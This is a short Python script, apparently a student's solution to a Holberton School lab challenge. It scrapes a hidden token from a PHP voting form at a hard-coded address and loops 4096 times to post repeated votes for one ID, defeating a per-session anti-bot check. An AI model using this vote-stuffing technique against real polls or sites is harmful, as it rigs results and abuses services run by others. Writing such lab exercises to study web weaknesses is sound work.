#!/usr/bin/python3
# 4096.py
# Danisile Jiyane<4502@holbertonschool.com>
"""Hodor with my Holberton ID 4096 times."""
import requests
from bs4 import BeautifulSoup

php = "http://158.69.76.135/level1.php"
vote = {
    "id": "375",
    "holdthedoor": "holdthedoor",
    "key": ""
}

if __name__ == "__main__":
    for i in range(0, 4096):
        session = requests.session()
        page = session.get(php)
        soup = BeautifulSoup(page.text, "html.parser")

        hidden_value = soup.find("form", {"method": "post"})
        hidden_value = hidden_value.find("input", {"type": "hidden"})
        vote["key"] = hidden_value["value"]

        session.post(php, data=vote)
